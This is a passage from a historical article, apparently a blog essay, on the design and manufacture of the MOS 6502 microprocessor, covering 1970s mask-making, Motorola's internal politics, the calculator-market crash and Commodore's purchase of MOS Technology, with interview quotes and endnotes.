plan where the room is full of tables and chairs and sofas with no space between them. Harry Bawcom, who previously worked on bipolar TTL layout at Motorola and was brought in to finish the 6800 microprocessor layout,[20] described cells this way:[21]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Cell design started with little stickies of transistors underneath clear mylar and you did the first pass with a grease pencil and a lot of iteration. That was a Bipolar technique that the MOS folks didn’t use. Probably why I was five times faster. By the time I picked up a pencil I knew where I was going.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;According to Mensch, these physical representations of cells used in drafting were also called “paper dolls”, a term that shows up every now and then in accounts of that era. Joel Karp, the first MOS chip designer at Intel, also used this term describing the rather painstaking layout process for the Intel 1102 and 1103 1024-bit DRAM ICs.[22] Another account, from New York’s Museum of Modern Art, described a Texas Instruments logic chip layout from around 1976:[23]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;At the time this plot was hand drafted, it was still possible to verify the design of individual components visually. To repeat a circuit element multiple times, an engineer would trace the initial drawing of the component, photocopy it onto mylar, then cut and glue it onto the diagram. The collage technique is referred to as “paper-doll layout.” Intended for use in a military computer, this particular chip was designed to sense low-level memory signals, amplify the signals to a specific size, and then store them in a memory cell for later recall.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;But the early microprocessor designs at Motorola and MOS Technology were just starting to emerge from the manual-only world. Here the computer-assisted aspects came into play: for the 6502, someone at MOS captured each cell on the Stabilene film using a Calma GDS workstation and digitizer.[24][12 page 12] (Bawcom refers to this person as the “Calma operator” but says he “did not witness this process at MOS Technology.”[21]) Where possible, the Calma workstation was used to replicate cells that could be repeated in the design.[21]&lt;/p&gt;&lt;p&gt;The digitizer was a drafting table with a precision position sensor that could record x-y coordinates of any position on the table. The workstation was a Data General Nova minicomputer[25] with 5 megabyte hard drive and 16K RAM. The minicomputers at that time were created mostly out of standard logic chips (like the 7400 series) in DIP packages — each typically containing an array of 2-8 components like gates, registers, multiplexers, etc. — soldered onto circuit boards to make a processor and other associated sections. A cabinet-sized computer, rather than a room-sized mainframe. (If you haven’t read Tracy Kidder’s Soul of a New Machine, make a note to do so: it chronicles the design of the Data General Eclipse, the successor to the Nova.) The Calma GDS stored the layout design as polygons and could be used to draw the layout on a plotter, or to cut a photomask drawing out of a red film called Rubylith, also using the plotter, but with a precision blade used in place of a plotter pen.[12 page 12][26] Then the unwanted sections of Rubylith would be removed very carefully by hand during what MOS Technology engineers called a “peeling party”, according to Albert Charpentier.[26]&lt;/p&gt;&lt;p&gt;After a lot of very careful checking and revision, the set of Rubylith photomask drawings — shown in this picture from the August 25, 1975 edition of EE Times — were photographically reduced to a set of master glass reticles, one per mask, at 10 times actual size.[24] Each 10× reticle was used to reduce the design further, producing a 1:1 mask using a machine called a reduction stepper, which precisely locates multiple copies covering most of the 3-inch[24][27] wafer. In early production, contact or proximity masks were used,[12][28][29] but once MOS had been able to upgrade to four-inch wafers,[29] a Perkin-Elmer Micralign projection mask aligner[27][1] was used to scan the 1:1 mask bit by bit, using a clever symmetrical optical system, for lithography steps.[30]&lt;/p&gt;&lt;p&gt;The Micralign projection aligner was one of several reasons the 6502 team was able to succeed, by improving yields. (Remember: die size and yield are vital!) Motorola’s NMOS process yields were poor[31][32], giving them cost disadvantages. Mensch says that Ed Armstrong, Motorola’s head of process engineering at the time, grew out his beard, waiting to shave it until they were able to get 10 good die on a wafer.[12][19][10] The MOS team was able to get much higher yield than Motorola, in part by using a projection mask system: previous-generation lithography systems used contact masks, which touched the wafers and had limited durability. Motorola had used contact masks for the 6800.[1 page 22] From Perkin-Elmer’s Micralign brochure:[33]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Historically, the manufacture of integrated circuits involved placing the photomask directly in contact with the wafer during the exposure process. Repeated just a few times, this contact soon degraded the mask surface and the photoresist layer. Each defect that resulted was then propagated through the replication cycle. Consequently, masks were considered expendable, to be used between five and fifteen times and then discarded.&lt;/p&gt;&lt;p&gt;These problems led to several attempts at prolonging mask life. One was to make the photomask from harder materials that were more resistant to abrasion. Another was to reduce abrasion by reducing or even eliminating the contact force. These efforts did improve mask life to a limited extent, but neither was as effective as optically projecting the photomask image onto the wafer.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;A second reason for the 6502’s higher yield was something MOS Technology referred to as “spot-knocking”[12 page 18], essentially a retouching of point defects in the masks.&lt;/p&gt;&lt;p&gt;The third reason for higher yields was through Mensch’s design rules — constraints on transistor size and feature spacing — which were conservative and much more tolerant of process variations,[19] a technique which he had learned on his own through experiences at Motorola, along with some lessons about what was and what wasn’t possible to achieve at the company.&lt;/p&gt;&lt;p&gt;Mensch’s first year at Motorola in 1971 was a rotation through four different departments: Applications, Circuit Design, Process Design, and Marketing.[34] At the Marketing department, his supervisor Dick Galloway asked him to put a quote together for IBM for memory chips over a seven year period, with pricing decreasing over time — a fairly complicated document, with lots of numbers that had to be typed accurately. So he decided rather than having a secretary type it up and go through the trouble of finding and correcting errors, he would write a FORTRAN program on the Motorola mainframe computer to take in parameters, plug in the numbers into some formulas, and print out the quote on a terminal with a thermal printer, which he then copied onto better paper. The Marketing staff asked him how he did it, and when he told them, Galloway said “Bill, we want you to work in the Design Group.” “Why is that?” “None of their chips work. We want you to work there. I think if you work there, the chips will work again.”[12][19]&lt;/p&gt;&lt;p&gt;As the new, inexperienced engineer in the IC design group, Bill Mensch’s introduction involved a lot of what the other engineers would call grunt work. Some of these efforts were to work on Motorola’s standard cell library in various MOS processes, and the process control monitor for memory and microcontroller designs.[24][12] The process control monitor (PCM) is a special set of test structures used to measure the parameters of basic circuit elements such as transistors, resistors, capacitors, and inverters — not only to make sure the manufacturing process is working as expected and check for statistical variation, but also to characterize these elements for simulation purposes. Nowadays it is typical to put those test structures in the scribe lines between ICs, since they can be so small, but in earlier IC designs the PCM is located in a few places on the wafer in place of the product, usually forming a plus-sign pattern of five PCMs. Early 6502 wafers from MOS Technology are — in 2022 at least — apparently nowhere to be found, but occasionally some later MOS wafers show up on eBay, and I did find a creator of “digital art”, Steve Emery at ChipScapes, who had a 4-inch Rockwell R6502 wafer, apparently from the mid 1980s (Synertek and Rockwell were both licensed by MOS Technology as a second-source for the 6502) on which you can see the PCMs. He was kind enough to take some photomicrographs of them for me:&lt;/p&gt;&lt;p&gt;Ray Hirt designed the PCMs for the MOS 6502[24]; the Rockwell PCMs shown here are almost certainly not the ones Hirt designed in 1974-1975, but the overall concept is the same. The Rockwell R6502 has two different types, three of one type in the middle rows of the wafer, and two of another type in the top and bottom.&lt;/p&gt;&lt;p&gt;The ones on the top and bottom look like an image resolution test on the various layers; there are no electrical connections:&lt;/p&gt;&lt;p&gt;The three others have a bunch of circuit pads connected to various test elements:&lt;/p&gt;&lt;p&gt;The PCMs that Mensch and Hirt designed included transistors of various dimensions, digital inverters, and ring oscillators. The inverter could be used to measure the input-output transfer function; the ring oscillator for measuring intrinsic time delays. The transistors typically included a minimum-size transistor (0.4 mil × 0.4 mil ≈ 10 μm × 10 μm in the early 1970s), and others with different widths and lengths, so that the parameters of the transistors could be characterized as a function of geometry.[2] In a 2014 interview, Mensch describes the PCMs during his early days at Motorola this way:[12]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;We had to make some changes to model because of things I found. And I found that narrow transistors had a higher voltage threshold than a short one, and these are things that the memory product guys didn’t use. And so they had to change their design because of what I found on the process control monitor. I put very narrow transistors, very wide transistors, very large transistors, and very short transistors, so I knew the characteristics and what the actual sizing might have an effect on.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;When I spoke with him in March, he described his experience a bit more candidly. As a young engineer at Motorola trying to learn the best way to design ICs, Mensch wanted to know what numbers to use for a transistor simulation model, so he asked around, and each of the design engineers had different numbers they used in their calculations; a typical exchange went like this:[2]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Mensch: Why are you using those numbers?&lt;/p&gt;&lt;p&gt;Engineer: Well, I just think it’s the right number.&lt;/p&gt;&lt;p&gt;Mensch: Yeah, but… but… who’s… who’s giving out the numbers? What temperature are you simulating it at?&lt;/p&gt;&lt;p&gt;Engineer: Well… at room temperature.&lt;/p&gt;&lt;p&gt;Mensch: Well, why room temperature?&lt;/p&gt;&lt;p&gt;Engineer: Well, that’s what we take the data on.&lt;/p&gt;&lt;p&gt;Mensch: Yeah, but you know it’s gonna run at 125°C, right? And minus 55, we need to get them to work that way.&lt;/p&gt;&lt;p&gt;Engineer: Yeah, but… whatever.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Mensch’s voltage threshold discovery — that gate threshold voltage on the same process varied with transistor geometry, and a good model would have to take this into account — was not immediately well-received; at first, engineers from the memory group didn’t believe him. He ended up sending around an inter-office memo to call a meeting (“MEETING TO PICK BILL’S SIMULATION NUMBERS”) and got everybody to attend by the happy accident of including Jack Haenichen on the cc: list of the memo. Haenichen was Motorola’s youngest vice-president, first elected in 1969 to become Vice President and Director of Operations, Services and Engineering in Motorola’s Semiconductor Products Division, at the age of 34; in early 1971 he was renamed to Director of Operations for MOS.[35][36][37] Haenichen had taken an interest in Mensch’s progress during his rotation in the Marketing department, and asked to be kept informed how things were going. As Mensch described it: “So this interoffice memo, everybody would see, ‘Hey, Jack’s on this list! Oh, we gotta show up.’ I never realized why all these people showed up at my meeting.” He eventually chose simulation parameters that were the worst case of all the other numbers.[2]&lt;/p&gt;&lt;p&gt;Over the next few years, an opportunity had begun to arise. Mensch was no longer a green engineer; by 1974, he had designed the 6820 Peripheral Interface Adapter, and he and Rod Orgill had worked together on design teams for two microprocessors at Motorola — the 5065, a custom microprocessor for Olivetti, and the Motorola 6800.[3] Mensch also had designed the PCM for the 6800, and put in test structures not only for the enhancement-load process of the 6800, but also for a depletion-load process, all ready to help prove out the superiority of the concept, just by making a slight change in the masks and the processing steps.[12] Meanwhile, Chuck Peddle had joined Motorola, and in 1974 was traveling the country giving seminars on the 6800 for prospective customers, who were very interested, but not at the price Motorola was offering. Peddle wanted to pursue a lower-cost version of the 6800.[1] Motorola had advantages in financial resources; the company’s 1972 Annual Report stated proudly that its revenues exceeded a billion dollars for the first time, and “Metal-oxide-semiconductor (MOS) integrated circuit sales for Motorola during ’72 grew at a faster rate than the world industry, whose growth was an estimated 60-70%.”[38] In 1973’s Annual Report, it stated \$1.437 billion in revenue, with the company’s Semiconductor Products Division reporting revenue “up more than 45% over the previous year”, and expressed an optimistic view of the microprocessor market:[39]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;The burgeoning microprocessor market is presenting the industry with a radical opportunity to engineer into electronic systems significant benefits not previously possible. The true extent to which microprocessors will be adopted is not yet apparent, even though the current picture indicates a possibly phenomenal market whose growth rate could eclipse that of today’s fastest growing semiconductor categories. Motorola has a major commitment to the microprocessor market, and we intend to secure a significant share. Development in this area has reached an advanced stage.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Motorola had already been in the electronics business for decades — starting with car radios in 1930 and getting into the semiconductor market with mass-production of germanium power transistors in 1955 — with a well-established sales and distribution network. It had the tools and staff to design and manufacture cutting-edge microprocessors.&lt;/p&gt;&lt;p&gt;So why was the low-cost 8-bit microprocessor a project at MOS Technology instead of Motorola?&lt;/p&gt;&lt;head rend="h3"&gt;The Elephant and the Hare&lt;/head&gt;&lt;p&gt;I have struggled to understand: Why not at Motorola? Motorola had all these resources, and an opportunity to follow up on the 6800, but at first glance appears to have squandered the opportunity.&lt;/p&gt;&lt;p&gt;Motorola and MOS Technology were two very different companies. In Motorola’s case, being a large company gave it significant long-term advantages, in the form of product diversity — Motorola was nearly a self-contained “supermarket” for the circuit designer, with discrete, analog, and digital ICs, so it benefited from many market trends in electronics — and inertia. Its size allowed Motorola some freedom to “coast”, when necessary, on its past successes. MOS Technology was small and agile, and had to survive by being competitive in a few specific areas like MOSFET-based IC design and manufacturing technology. A business failure of a few million dollars would have been a minor setback for Motorola, but a mortal wound for MOS.&lt;/p&gt;&lt;p&gt;A 1970 ad campaign describes “Motorola’s Ponderous Pachyderm Syndrome”,[40] something that seems like incredibly poor marketing:&lt;/p&gt;&lt;p&gt;Haenichen described in an interview:[41]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Motorola, at the time, was called the “Ponderous Pachyderm” by the industry people. In other words, we maybe were not the “latest and greatest” but when we started making something, we wiped everybody out, because we just made them by the billions — that was our reputation, slow moving but good.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Yeah, um… okay. I get the idea. Take a little longer and become a dominant player in the industry… sure. But a “ponderous pachyderm” as high-tech corporate metaphor? Not exactly the most inspiring.&lt;/p&gt;&lt;p&gt;And yet, if we fast-forward to the 1980s and 1990s: Motorola did find success in its microprocessor offerings, reaching its zenith a few years after the 6800 and its follow-up, the 6801 — in the form of the 68000 series, which were produced roughly from 1979 - 1994 and used in many systems, notably the Apple Macintosh. And later 6800-series ICs like the 68HC11 took a prominent position in the microcontroller market.&lt;/p&gt;&lt;p&gt;Even by early 1980, the 6800 and 6809 achieved market success. While looking for historical pricing information in Byte Magazine’s January 1980 issue, I came across several ads for third-party systems and software tools for the 6800 and 6809. The chip distributor ads in the back of the magazine listed various microprocessors, almost all in the \$10 - \$20 range, including the Zilog Z80, the 6502, the 6800, RCA’s CD1802, and Intel’s 8080. Motorola had been able to lower the cost of the 6800.&lt;/p&gt;&lt;p&gt;But 1974 was a different story. With a major economic recession looming, Motorola’s Semiconductor Products division turned more risk-averse, and focused on getting the 6800 out the door successfully. Mensch, who had worked on the 6800’s process control monitor, and snuck in a depletion-load version in addition to the normal enhancement-load PCM, was pushing to have one wafer ion-implanted to try out the depletion-load process. When he talked to Armstrong (head of process engineering) he was finally told why they wouldn’t let him investigate depletion-mode: “We were afraid you wouldn’t complete the designs with enhancement mode.”[19]&lt;/p&gt;&lt;p&gt;Tom Bennett, who led the chip design of the 6800, described relying on depletion loads as “a little risky”:[31]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;We did the ion-implant only of the substrate. There was an extra one or two process steps to do the depletion load. And it was determined that, you know, that might be a little risky. That’s why we went to all these other, you know, hardware extremes to get around that. And so we compensated for it with design.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Given the process problems Motorola was having with just getting enhancement mode NMOS to work, perhaps this was the right decision for Motorola after all.&lt;/p&gt;&lt;p&gt;Internal politics and friction also hampered the 6800 project.[42] The sense I get, in talking to Bill Mensch and reading other accounts of the 6502 and 6800, was that at Motorola, getting things done depended on being on good terms with other staff and with managers — the old adage, it’s not what you know, it’s who you know. Bill Lattin, a member of the Motorola design team interviewed by the Computer History Museum in 2008, described this environment’s effect on the 6800 this way:[43]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Well, the amazing thing is that it succeeded as well as it did. Having gone to Intel and seeing a very — a company that does a very structured strategic plan every year, and knows where to focus the resources, Motorola was a bottoms-up. A strength of an idea would get sold, and or Doug Powell would get it and he would push it. And then Tom would get it, and convince everybody, you know, we want to work on that. And it was, you know, having now been in management, and looking back I kind of say, “What could have happened here with 6800 had there been strategic direction from the whole company, you know, moving down this way?” And so it was a phenomenal success. I’m privileged to have worked with really bright guys pulling it off, and against chaos that was put in everybody’s way.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;The 6800 team succeeded in getting management buy-in; Peddle and Mensch did not with their low-cost microprocessor. But Peddle joined the 6800 team fairly late in the project, and Mensch was a junior engineer learning the hard way that technical merit was not enough.&lt;/p&gt;&lt;p&gt;Aside from the recessionary climate and internal politics, there is one more significant reason that dampened Motorola’s eagerness towards pursuing microprocessors. Being a large, diversified company sometimes presented a conflict of interest between Motorola’s different semiconductor groups. Even the 6800 team faced this: each market opportunity for the company to sell an integrated microprocessor like the 6800 would compete against circuit-board-level processors designed with less-integrated logic chips. Within Motorola, that would mean less business selling standard logic chips, and among Motorola’s customers, it might put some of the minicomputer companies’ designs at risk.[44] From the Computer History Museum’s 2008 interview:[43]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Bennett: And interesting. The only one that really asked some questions which I thought were important was Bob Galvin. And his comment was when he looked at it he says, “You understand that you’re putting our customer’s chip — or system — on one of these little boards?” He said, “What’s that gonna do to my other products?” But that’s where it was at that point in time. The other thing…&lt;/p&gt;&lt;p&gt;Ekiss: Yeah, HP really recognized that, because I had called on them as a customer, and they quizzed me up and down about the implications for the semiconductor company to be able to make products like this. Because we were now right on their turf.&lt;/p&gt;&lt;p&gt;Laws: We did the recording of the 8008 oral history several months ago, and listening to the tremendous battles that went on in Intel between the memory people who were terrified that processor people were going to be treading on their [customer’s] turf and taking away their business. So it was not unique to Motorola.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;There’s a gap in the historical record here: it would be nice to find a well-reasoned explanation from Motorola’s management why they told Peddle to stop working on a low-cost microprocessor.[45] But I will hazard a guess: just consider that in 1974, Motorola was still trying to bring the 6800 to production so they could start selling it to make some money back on their investment — John Ekiss related that they had been relying on income from large customers like National Cash Register, who’d been buying ROMs, to fund new engineering efforts[43] — and here’s this guy Peddle who’s been at Motorola for less than a year, squawking about how they need to sell a lower-cost processor, which would potentially compete with the 6800 that hadn’t even been released yet, and which would earn Motorola less profit per processor sold. Oh, and yes, there’s a recession going on. So please, Chuck, stop it and help us sell the 6800.&lt;/p&gt;&lt;p&gt;Sometime around early 1974, management announced that the microprocessor group would be moving from Mesa, Arizona to Austin, Texas — an unpopular decision — and at about that point Peddle proposed jumping ship.[1][12][43]&lt;/p&gt;&lt;p&gt;In one presentation, Mensch alludes to Star Wars, describing the eight departing Motorolans as “Rebels” leaving the Motorola “Empire”,[24] going to MOS Technology instead, in order to make their vision into reality. In some ways it is not surprising that they succeeded. Working with fewer resources and fewer people, the team had to be creative to make things work, but fewer people can also be an asset. In The Mythical Man-Month, Rodney Brooks talks about the concept of “conceptual integrity”, of having a unified design: “I will contend that conceptual integrity is the most important consideration in system design. It is better to have a system omit certain anomalous features and improvements, but to reflect one set of design ideas.”&lt;/p&gt;&lt;p&gt;Mensch related how Stephen Diamond asked him about the oscillator section of the 6502:[10]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;And he says, “Bill, didn’t you have trouble with that?”&lt;/p&gt;&lt;p&gt;I go, “No, why, why do you ask? It was just, you know, you just know what the edges needed, so that the feedback from like the X register from the output to the input when you’re loading a new value, you want to not lose what’s in there while, you know, because you don’t want to feed back the output from it or you won’t load the new value right,” and I said, “so that we all knew what the timing was.”&lt;/p&gt;&lt;p&gt;But he says, “Well, we had to struggle with that and we had all kinds of—“&lt;/p&gt;&lt;p&gt;I said, “Oh, I think I know why. How many engineers did you have on it?”&lt;/p&gt;&lt;p&gt;“Oh, I don’t know, maybe 20.”&lt;/p&gt;&lt;p&gt;I go, “That’s the problem. We didn’t have that many engineers, so… ours worked.”&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Mensch describes how leaving Motorola and getting to MOS allowed him and Rod Orgill to figure out how to design what they felt was the right microprocessor:[19]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Big companies sometimes manage the passion out of the engineers with broken promises and disrespect coming from management not knowing the effort needed for pioneering effort. At MOS with the small team we created and kept the passion to do the best humanly done. Since this was Rod’s and my third (6501) and fourth (6502) microprocessor designs following the Olivetti 5065 CPU and 6800, we knew what we had to do to make a processor to change the world of processing at the microprocessor level.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;And unlike at Motorola, at MOS Technology there was no handicap in working on a low-cost state-of-the-art microprocessor, no other design groups or customers to worry about avoiding a conflict of interest.&lt;/p&gt;&lt;p&gt;From the first day the “Rebels” were on the payroll at MOS in Pennsylvania — August 19, 1974, freed from the Ponderous Pachyderm, and motivated to succeed — to bringing MCS 6502 chips into production, ready for sale, it would take just over a year.[12]&lt;/p&gt;&lt;p&gt;The 6502 was aimed to compete in price against the Intel 4040 in the microprocessor-based control systems market[46], but blew it away in technical specs: the 4040 was a 4-bit processor with a slower maximum clock frequency and required a 15V supply.&lt;/p&gt;&lt;p&gt;By summer of 1975, MOS Technology was gearing up for an introduction in September at WESCON 75 in San Francisco, and took out ads focused on the 6501:[47]&lt;/p&gt;&lt;p&gt;Here the story takes one of those legendary turns. Steve Wozniak had been designing the Apple I around the Motorola 6800, but he sees the MOS Technology ad, realizes he can get a better price (even better than a Motorola discount he can take advantage of as a Hewlett-Packard employee[48]), goes to WESCON, and buys a couple of chips from Peddle, who’s selling them in a jar from a suite in a nearby hotel because WESCON won’t let them sell product at the convention[49][10]. The 6502 is soon in the Apple I design. Only two hundred Apple I computers were manufactured in 1976, but by that time, Wozniak is already thinking about the Apple II, introduced in 1977, which will quickly take off like a rocket, starting the use of the 6502 in the personal computer industry with a bang.&lt;/p&gt;&lt;head rend="h3"&gt;The 1970s Pocket Calculator Crisis&lt;/head&gt;&lt;p&gt;But before Steve Wozniak and Steve Jobs incorporated as Apple Computer Inc., to bring Woz’s Apple II design to fruition, Wozniak was still an employee of Hewlett-Packard working on electronic calculators. Computers? No, calculators. (This is such a “Video Killed the Radio Star” moment in history.)&lt;/p&gt;&lt;p&gt;MOS Technology was still looking for customers. In September 1976, it was purchased by Commodore, a calculator manufacturer, in a move that, to me, appears to be one of financial desperation… but it set the combined company on an arc that lasted the next 18 years as it crossed into personal computers. The magazine New Scientist chronicled the tone of the times in two articles, the first in November 1975 (“Coming of Age in the Calculator Business”):[59]&lt;/p&gt;&lt;quote&gt;&lt;p&gt;… The LSI revolution started by specialist semiconductor suppliers like General Microsystems Inc along the 30 mile strip between San Francisco and San Jose (known nowadays as Silicon Gulch) effectively wiped out the cheap labour advantage of South-East Asia in a single stroke — and ensured that the market for pocket-sized calculators henceforth would be dominated overwhelmingly by US firms.&lt;/p&gt;&lt;p&gt;…&lt;/p&gt;&lt;p&gt;By 1971, Bowmar had successfully married a compact LSI chip to a small light-emitting diode (LED) display to provide what was to be the first truly compact, hand-held pocket-sized calculator using a chip developed by Texas Instruments. Incredibly, Bowmar was not interested in marketing the pocket calculator itself, and tried instead to sell the idea in turn to most of the leading manufacturers of electro-mechanical calculating machines. Commodore was one of the two firms that agreed to market the pocket calculator for them; the other was a home entertainment supplier called Craig.&lt;/p&gt;&lt;p&gt;So rapid was the take-off in the pocket calculator market that, by the following year, Bowmar was struggling to get back into the business. Another original component supplier, American Microsystems, also moved into calculator manufacture in 1972 under the trade name Unicom. This “vertical integration”, from the bottom up, then became the fashion. The world’s largest supplier of semiconductor components, Texas Instruments, started manufacturing calculators late in 1972, and was joined by National Semiconductor in 1973.&lt;/p&gt;&lt;p&gt;While the major semiconductor suppliers were attracted by the large profit margins on finished calculators, the leading calculator assembly houses grew anxious about the supply of components and several consequently began to integrate the business downwards. However, the more sensible stopped short of actually manufacturing chips, but designed their own integrated circuits and then farmed them out to other semiconductor suppliers to manufacture for them.&lt;/p&gt;&lt;p&gt;Though prices were still relatively high (the cheapest four-function machine still cost more than £30 in 1973), the pocket calculator quickly caught the public’s imagination. Sales rocketed, and prices crashed accordingly. Between 1968 and 1972, five of the original 18 firms involved in pioneering electronic calculators had dropped out, but 35 new names had joined the ranks. Since then, many other big names have fallen by the wayside, including Anita, SCM/Marchant, Rapidata, Summit, Seiko and Sony. Even Bowmar ultimately had to file for protection under “Chapter XI” of the US bankruptcy law. Unicom was submerged into Rockwell and Remington Rand departed from the field.&lt;/p&gt;&lt;p&gt;What happened to the profits?&lt;/p&gt;&lt;p&gt;This year the big vertically integrated calculator firms have seen their profits vanish, and some of the calculator assembly houses are now in really deep trouble. Even Commodore is struggling to survive. Two weeks ago the firm reported its end of year results, which showed a \$4.3 million loss on sales which were up 12 per cent over the year to \$55.9 million. Commodore is now pinning most of its hopes on the European market, which is nowhere near as stagnant as the American market has been lately.&lt;/p&gt;&lt;p&gt;Only a handful of calculator firms look like surviving the present recession and the names that British retailers quote with confidence include Texas Instruments, Hewlett-Packard, Commodore (CBM), Litronix and Sinclair. Vertical integration in itself is no longer seen as the best way of ensuring survival. Certainly firms like Texas Instruments, who make practically all the components that go into their calculators themselves, will continue to dominate the market — not by virtue of their vertical integration but really because of their overall financial strength. But given a replacement market of 50 million units per year, the industry is obviously settling down to an era of maturity, which will be dominated by one or two really large suppliers and supported by a number of smaller companies specialising in more innovative designs. The prices of pocket calculators are not likely to fall appreciably, but the user will continue to get increasing calculating power for his money.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;Wow! This article was quite prescient, and seems to have got almost everything right, except for that bit about “The prices of pocket calculators are not likely to fall appreciably” — only a year later, Texas Instruments introduced the TI-30 in June 1976 for a \$24.95 suggested retail price. (TI achieved this price point by designing it around a single TI chip, the TMC0981.) The rest, about the consolidation of the industry and anxiety of calculator manufacturers as IC manufacturers got into the calculator business, was right on the money.&lt;/p&gt;&lt;p&gt;What I have not yet mentioned was that MOS Technology was started in 1969 by Allen-Bradley as a means to second-source TI’s calculator chips. Up until the 6502, the bulk of its business was in the calculator chip industry. With TI becoming a dominant force in the calculator industry, as its volumes surged and prices fell, MOS Technology was in trouble. Commodore was also in trouble, and at the very least saw a conflict of interest with TI (namely buying second-sourced TI chips when TI was a competitor for finished calculators) which it could solve by purchasing MOS Technology. New Scientist covered this in a brief filler article in its September 9, 1976 issue titled “Calculator manufacturer integrates downwards”:[60]&lt;/p&gt;&lt;p&gt;You will note that there is no mention whatsoever of the 6502; it is only hinted at: (emphasis is mine, along with bracketed annotations)&lt;/p&gt;&lt;quote&gt;&lt;p&gt;Commodore, the Canadian owned American based calculator manufacturer which markets under the name CBM in Britain, has announced its intention of entering integrated circuit component manufacture with a recent take-over. Unlike several of its competitors (such as Rockwell, National, and Texas Instruments) who are primarily microcircuit manufacturers but who have also integrated vertically upwards into end-products like calculators, Commodore is integrating downwards in order to protect its supply of components.&lt;/p&gt;&lt;p&gt;Commodore, quoted at \$60 million on the New York Stock Exchange, has acquired 100 per cent of the equity of MOS Technology Inc. of Pennsylvania in exchange for a 9.4 per cent equity stake in Commodore. MOS Technology is privately owned and valued at around \$12 million. It has an integrated circuit manufacturing plant in Valley Forge, Pennsylvania.&lt;/p&gt;&lt;p&gt;MOS Technology has been closely associated with Commodore for some years. The integrated circuit chip that went into CBM’s successful SR36/37 calculator came from MOS Technology, as does the current chip for the SR7919D calculator (a model which is rumoured to have around 25 per cent of the UK scientific calculator market) and others of the current CBM range. But the firm not only makes integrated circuits for calculators, it has also lately launched a video game chip for four players and is currently marketing a successful microprocessor [the 6502].&lt;/p&gt;&lt;p&gt;At present, Commodore produces the art-work for its calculator chips and subcontracts the chip manufacture to outside plants around the world with spare capacity. The recent purchase of factories in the Far East has enabled it to assemble electronic watch modules by this subcontracting method. But as the up-turn in the economy begins to effect [sic] the consumer electronics industry, less spare capacity is becoming available for this type of subcontracting. When considered along with the additional recent purchase of an LED display manufacturing facility, Commodore now has a completely integrated operation.&lt;/p&gt;&lt;/quote&gt;&lt;p&gt;But supply chain issues were front and center: even in 1976, electronics companies were having to weigh trade-offs of external vs. internal IC fabrication. Internal fabs ensured a stable supply would be available, at the cost of running the fab. External fabs ensured flexibility to deal with demand fluctuations… as long as spare capacity was available.&lt;/p&gt;&lt;p&gt;(1976 is also notable as the birth of the Taiwan semiconductor industry: an April 1976 deal between the Taiwanese government and RCA led to technology transfer of integrated circuit manufacturing by training 19 engineers from the Industrial Technology Research Institute.)&lt;/p&gt;&lt;p&gt;MOS Technology became Commodore Semiconductor Group. Chuck Peddle convinced Commodore founder and president Jack Tramiel to enter the personal computer market with the Commodore PET, introduced in 1977. The VIC-20 and Commodore 64 (“C64”) followed in 1981 and 1982, respectively. The C64 dominated the personal computer market in the mid-1980s. Jack Tramiel left Commodore in 1984. Ten years later, without the luck and leadership that led to the MOS Technology purchase and the success of the 6502 and C64, Commodore declared bankruptcy.&lt;/p&gt;&lt;p&gt;One major takeaway, from all of this discussion about MOS and Commodore, is that market forces are paramount in planning semiconductor design and manufacturing. Today we have “megatrends” like AI and 5G that are cited frequently; for example, onsemi — formerly known as ON Semiconductor — describes itself by saying With a focus on automotive and industrial end-markets, the company is accelerating change in megatrends such as vehicle electrification and safety, sustainable energy grids, industrial automation, and 5G and cloud infrastructure. In the 1970s and 1980s, calculators and personal computers and video game consoles were the megatrends. Companies like MOS and Commodore struggled to keep on top of the rising and falling waves of technology demand.&lt;/p&gt;&lt;p&gt;Back to the IC fabrication process: Commodore International commissioned a short documentary video in 1984 on the manufacturing process for its chips (at the MOS plant in Pennsylvania) and its Commodore 64 computers. The video’s narration is in German, also wenn Sie Deutsch sprechen, or you can parse the simply awful automated subtitles, perhaps it is of interest.&lt;/p&gt;&lt;head rend="h3"&gt;Notes&lt;/head&gt;&lt;p&gt;[1] Oral History of Charles Ingerham “Chuck” Peddle, Computer History Museum, 2014. [2] Bill Mensch, interview, March 9, 2022. Mensch has graciously taken the time to answer many of my questions, and told me some colorful stories about his days at Motorola and MOS Technology. (For example: apparently Chuck Peddle insisted on doing some of the first-silicon verification of the 6502 all by himself, painstakingly testing each opcode in sequence and reporting the result, calling out “Load A works” or “Transfer S to X works”, as Mensch and Rod Orgill watched, with nothing to do but sit in suspense and echo each of Peddle’s calls with a frenzied, victorious, hollering sports-fan cheer: “YEAAHHHH! LOAD A WORKS!” This article is already too long, but perhaps I will collect some of the anecdotes for another day.) [3] Bill Mensch, personal communication (including clarifications to Mar 9 interview), May 2, 2022. [4] Robert H. Cushman, 2-1/2-generation μP’s—\$10 parts that perform like low-end mini’s, EDN, September 20, 1975. [5] Bill Mensch, personal communication, February 11, 2022. [6] Terry Holdt, “019-H” process run sheet, February 17, 1975, on team6502.org website. [7] The question of exactly who worked on what aspects of 6502 is a sticky one. I have made my best effort given the sources available. For the instruction set architecture, for example: Wikipedia quotes Brian Bagnall’s book[49] nearly verbatim: “Chuck Peddle, Will Mathis, and Rod Orgill would collaborate to design the initial architecture for the new microprocessor.” US Patent #3991307 for binary coded decimal correction was granted to Peddle, Mathys, 